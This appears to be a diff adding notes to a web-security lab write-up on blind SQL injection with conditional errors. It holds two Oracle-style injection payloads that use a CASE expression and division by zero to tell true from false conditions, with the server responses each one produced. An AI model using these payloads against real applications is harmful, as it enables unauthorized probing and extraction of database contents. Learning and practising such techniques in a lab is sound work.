@@ -1,2 +1,8 @@
 Lab #12: Blind SQL injection with conditional errors
 
+
+Getting no error. 200 OK
+' and (select case when (1=2) then to_char(1/0) else 'a' END from dual)='a
+
+500 internal server error
+' and (select case when (1=1) then to_char(1/0) else 'a' END from dual)='a
